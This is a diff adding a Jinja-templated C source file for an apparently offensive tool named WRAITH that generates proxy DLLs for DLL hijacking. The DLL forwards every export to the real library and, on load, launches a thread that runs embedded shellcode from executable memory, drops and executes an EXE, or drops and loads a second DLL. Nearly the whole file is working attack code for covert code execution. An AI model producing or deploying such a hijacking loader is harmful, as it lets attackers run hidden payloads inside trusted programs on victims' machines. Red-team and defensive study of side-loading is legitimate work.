@@ -1,0 +1,128 @@
+/*
+ * WRAITH Proxy DLL — auto-generated, do not edit by hand
+ * ─────────────────────────────────────────────────────
+ * Host binary : {{ binary_name }}
+ * Target DLL  : {{ target_dll }}
+ * Real DLL    : {{ real_dll_basename }}
+ * Payload mode: {{ payload_type }}
+ * Generated   : {{ timestamp }}
+ *
+ * Compile (MSVC, x64):
+ *   cl.exe /LD /Fe:{{ target_dll }} {{ c_filename }}
+ *
+ * Compile (MinGW cross-compile):
+ *   x86_64-w64-mingw32-gcc -shared -o {{ target_dll }} {{ c_filename }} \
+ *       {{ target_dll_stem }}.def -lkernel32 -s
+ */
+
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <stdlib.h>
+#include <string.h>
+
+/* ── Export forwarding ──────────────────────────────────────────────── */
+{% for exp in exports %}
+{% if exp.name %}
+#pragma comment(linker, "/export:{{ exp.name }}={{ real_dll_basename }}.{{ exp.name }},@{{ exp.ordinal }}")
+{% else %}
+#pragma comment(linker, "/export:#{{ exp.ordinal }}={{ real_dll_basename }}.#{{ exp.ordinal }},@{{ exp.ordinal }},NONAME")
+{% endif %}
+{% endfor %}
+{% if not exports %}
+/* No exports to forward — DLL is loaded for side-effects only */
+{% endif %}
+
+/* ── Payload ────────────────────────────────────────────────────────── */
+{% if payload_type == "stub" %}
+/* STUB MODE — no payload embedded, export forwarding only */
+
+{% elif payload_type == "shellcode" %}
+static const unsigned char sc[] = {
+    {{ shellcode_hex }}
+};
+static const SIZE_T sc_len = {{ shellcode_len }}UL;
+
+static DWORD WINAPI RunPayload(LPVOID _lpParam) {
+    LPVOID mem = VirtualAlloc(NULL, sc_len,
+                              MEM_COMMIT | MEM_RESERVE,
+                              PAGE_EXECUTE_READWRITE);
+    if (!mem) return 1UL;
+    RtlMoveMemory(mem, sc, sc_len);
+    ((void(*)(void))mem)();
+    VirtualFree(mem, 0, MEM_RELEASE);
+    return 0UL;
+}
+
+{% elif payload_type == "exe-dropper" %}
+static const unsigned char g_payload[] = {
+    {{ payload_hex }}
+};
+static const SIZE_T g_payload_len = {{ payload_len }}UL;
+static const char   g_drop_path[] = "{{ drop_path }}";
+
+static DWORD WINAPI RunPayload(LPVOID _lpParam) {
+    /* Create parent directory */
+    char dir[MAX_PATH];
+    lstrcpyA(dir, g_drop_path);
+    char *last = strrchr(dir, '\\');
+    if (last) { *last = '\0'; CreateDirectoryA(dir, NULL); }
+
+    /* Write payload bytes to disk */
+    HANDLE hf = CreateFileA(g_drop_path, GENERIC_WRITE, 0, NULL,
+                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hf == INVALID_HANDLE_VALUE) return 1UL;
+    DWORD written = 0;
+    WriteFile(hf, g_payload, (DWORD)g_payload_len, &written, NULL);
+    CloseHandle(hf);
+
+    /* Execute */
+    STARTUPINFOA si;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+    if (!CreateProcessA(g_drop_path, NULL, NULL, NULL,
+                        FALSE, 0, NULL, NULL, &si, &pi)) return 1UL;
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return 0UL;
+}
+
+{% elif payload_type == "dll-load" %}
+static const unsigned char g_payload[] = {
+    {{ payload_hex }}
+};
+static const SIZE_T g_payload_len = {{ payload_len }}UL;
+static const char   g_drop_path[] = "{{ drop_path }}";
+
+static DWORD WINAPI RunPayload(LPVOID _lpParam) {
+    /* Write DLL to temp path then load it */
+    char dir[MAX_PATH];
+    lstrcpyA(dir, g_drop_path);
+    char *last = strrchr(dir, '\\');
+    if (last) { *last = '\0'; CreateDirectoryA(dir, NULL); }
+
+    HANDLE hf = CreateFileA(g_drop_path, GENERIC_WRITE, 0, NULL,
+                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hf == INVALID_HANDLE_VALUE) return 1UL;
+    DWORD written = 0;
+    WriteFile(hf, g_payload, (DWORD)g_payload_len, &written, NULL);
+    CloseHandle(hf);
+
+    LoadLibraryA(g_drop_path);
+    return 0UL;
+}
+{% endif %}
+
+/* ── DllMain ────────────────────────────────────────────────────────── */
+BOOL WINAPI DllMain(HINSTANCE hDll, DWORD fdwReason, LPVOID lpReserved) {
+    (void)lpReserved;
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(hDll);
+{% if payload_type != "stub" %}
+        HANDLE ht = CreateThread(NULL, 0, RunPayload, NULL, 0, NULL);
+        if (ht) CloseHandle(ht);
+{% endif %}
+    }
+    return TRUE;
+}
